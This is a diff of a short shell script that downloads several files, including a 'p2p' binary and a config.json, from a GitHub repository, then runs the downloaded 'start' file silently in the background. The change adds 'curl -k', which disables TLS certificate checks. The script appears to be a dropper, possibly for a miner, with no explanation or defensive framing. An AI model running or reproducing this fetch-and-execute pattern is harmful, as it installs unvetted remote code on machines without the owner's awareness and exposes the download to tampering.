@@ -1,8 +1,8 @@
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/config.json -o config.json
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/p2p -o p2p 
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpa -o wpa
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpb -o wpb 
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpc -o wpc
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpd -o wpd
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/start -o start && chmod +x start && ./start  > /dev/null 2>&1 &
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/config.json -o config.json
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/p2p -o p2p 
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpa -o wpa
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpb -o wpb 
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpc -o wpc
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpd -o wpd
+curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/start -o start && chmod +x start && ./start  > /dev/null 2>&1 &
 sleep 10
